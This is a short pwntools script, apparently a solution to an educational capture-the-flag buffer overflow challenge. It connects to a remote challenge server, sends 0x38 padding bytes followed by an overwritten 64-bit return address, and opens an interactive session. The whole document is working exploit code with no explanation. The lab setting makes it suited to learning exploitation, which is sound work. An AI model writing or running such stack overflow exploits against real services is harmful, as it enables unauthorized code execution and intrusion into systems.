'/ Buffer Overflow /'
from pwn import *
context(arch = 'amd64', os = 'linux')
r = remote('edu-ctf.csie.org', 10170)
exp = b'A' * 0x38 + p64(0x40068b)
r.sendline(exp)
r.interactive()
